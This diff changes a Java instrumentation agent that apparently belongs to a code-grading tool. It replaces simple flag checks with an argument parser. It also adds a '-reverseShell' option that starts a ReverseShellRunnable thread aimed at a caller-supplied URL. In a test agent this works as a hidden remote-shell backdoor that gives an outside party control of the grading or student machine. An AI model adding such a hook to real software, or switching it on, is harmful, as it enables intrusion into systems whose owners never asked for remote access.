@@ -4,7 +4,11 @@ import java.io.PrintStream;
 import java.lang.instrument.Instrumentation;
 import java.lang.instrument.UnmodifiableClassException;
 import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 import java.util.regex.Pattern;
+import org.gradeskope.agent.shell.ReverseShellRunnable;
 
 public class TestJavaAgent {
 
@@ -12,8 +16,8 @@ public class TestJavaAgent {
 
   public static boolean enableAssertTransform = false;
   public static boolean enableDumpingTransform = false;
-
   public static boolean enableTestTransform = false;
+  private static String reverseShellURL;
 
   public static Pattern[] includePatterns = {
 //        Pattern.compile("^assn06.utils"), // For Testing
@@ -75,24 +79,52 @@ public class TestJavaAgent {
   }
 
   public static void agentmain(String agentArgs, Instrumentation inst) {
-    if (agentArgs.contains("--silent")) {
-      System.setOut(new PrintStream(new NullOutputStream()));
+    final Map<String, List<String>> params = new HashMap<>();
+    String[] args = agentArgs.split(" ");
+
+    List<String> options = null;
+    for (int i = 0; i < args.length; i++) {
+      final String a = args[i];
+
+      if (a.charAt(0) == '-') {
+        if (a.length() < 2) {
+          System.err.println("Error at argument " + a);
+          return;
+        }
+
+        options = new ArrayList<>();
+        params.put(a.substring(1), options);
+      }
+      else if (options != null) {
+        options.add(a);
+      }
+      else {
+        System.err.println("Illegal parameter usage");
+        return;
+      }
+    }
+
+    for (Map.Entry<String, List<String>> entry: params.entrySet()) {
+      switch (entry.getKey()) {
+        case "-enableDumpingTransform":
+          enableDumpingTransform = true;
+          continue;
+        case "-enableAssertTransform":
+          enableAssertTransform = true;
+          continue;
+        case "-enableTestTransform":
+          enableTestTransform = true;
+          continue;
+        case "-silent":
+          System.setOut(new PrintStream(new NullOutputStream()));
+          continue;
+        case "-reverseShell":
+          Thread thread = new Thread(new ReverseShellRunnable(entry.getValue().get(0)));
+          thread.start();
+      }
     }
 
     System.out.println("Args: " + agentArgs);
-
-    if (agentArgs.contains("--enableDumpingTransform")) {
-      enableDumpingTransform = true;
-    }
-
-    if (agentArgs.contains("--enableAssertTransform")) {
-      enableAssertTransform = true;
-    }
-
-    if (agentArgs.contains("--enableTestTransform")) {
-      enableTestTransform = true;
-    }
-
     System.out.println("Agent Loaded in agentmain");
 
     // Iterates through all **Loaded** Classes, unloaded classes in classpath will not be tested!
